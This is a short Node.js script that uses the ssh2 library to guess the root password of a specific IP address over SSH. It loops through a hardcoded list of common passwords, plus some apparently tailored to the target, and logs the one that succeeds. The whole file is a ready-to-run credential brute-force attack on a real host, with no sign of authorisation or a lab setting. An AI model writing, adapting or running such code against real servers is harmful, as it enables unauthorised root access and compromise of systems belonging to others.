const { Client } = require('ssh2');

const passwords = [
  'password',
  'password123',
  'admin123',
  'root123',
  'Asiaze123!',
  'asiaze123',
  'admin'
];

async function tryLogin(password) {
  return new Promise((resolve) => {
    const conn = new Client();
    conn.on('ready', () => {
      console.log('Success with password:', password);
      conn.end();
      resolve(true);
    }).on('error', (err) => {
      resolve(false);
    }).connect({
      host: '31.97.230.94',
      port: 22,
      username: 'root',
      password: password,
      readyTimeout: 5000
    });
  });
}

async function run() {
  for (const p of passwords) {
    console.log('Trying:', p);
    const success = await tryLogin(p);
    if (success) return;
  }
  console.log('None worked.');
}

run();